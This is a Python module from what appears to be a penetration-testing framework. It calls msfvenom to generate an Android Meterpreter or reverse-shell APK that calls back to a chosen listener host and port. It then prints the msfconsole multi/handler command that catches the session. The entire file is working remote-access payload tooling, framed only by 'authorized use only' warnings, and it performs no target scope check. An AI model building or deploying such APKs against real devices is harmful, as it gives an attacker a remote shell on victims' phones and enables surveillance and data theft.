"""entr0py.modules.mobile.android_payload — Generate an Android payload APK via msfvenom."""
from __future__ import annotations
from typing import Any, AsyncIterator
from entr0py.core.base import Category, Module, ModuleMeta, Option, OptionType


class AndroidPayload(Module):
    meta = ModuleMeta(
        name="Android Payload (msfvenom)",
        slug="android_payload",
        description=(
            "Generate an Android Meterpreter/shell payload APK with msfvenom and print the "
            "matching multi/handler. Authorized testing of your OWN devices only."
        ),
        category=Category.MOBILE,
        author="Metasploit / Rapid7",
        version="6.x",
        tags=["android", "payload", "meterpreter", "msfvenom", "c2"],
        tools=["msfvenom"],   # ships with metasploit-framework (already installed)
        offensive=False,      # generation has no live target to scope-check
    )

    def options(self) -> list[Option]:
        return [
            Option("lhost",   "LHOST", "Your listener IP/host (where the session calls back)"),
            Option("lport",   "LPORT", "Your listener port",
                   type=OptionType.INTEGER, required=False, default=4444),
            Option("payload", "-p", "Payload variant",
                   type=OptionType.CHOICE, required=False,
                   default="android/meterpreter/reverse_tcp",
                   choices=[
                       "android/meterpreter/reverse_tcp",
                       "android/meterpreter/reverse_https",
                       "android/meterpreter/reverse_http",
                       "android/shell/reverse_tcp",
                   ]),
            Option("output",  "-o", "Output APK path",
                   required=False, default="payload.apk"),
        ]

    async def run(self, opts: dict[str, Any]) -> AsyncIterator[str]:
        lhost   = opts["lhost"]
        lport   = str(opts.get("lport", 4444))
        payload = opts.get("payload", "android/meterpreter/reverse_tcp")
        output  = opts.get("output", "payload.apk")

        yield ("[!] Authorized use only — install the generated APK only on devices you own "
               "or have explicit written permission to test.")
        yield f"[*] Generating {payload}  →  {output}"
        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-o", output]
        async for line in self._exec(cmd):
            yield line

        yield ""
        yield "[+] Catch the session with the matching handler:"
        yield (f'    msfconsole -q -x "use exploit/multi/handler; '
               f'set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run"')
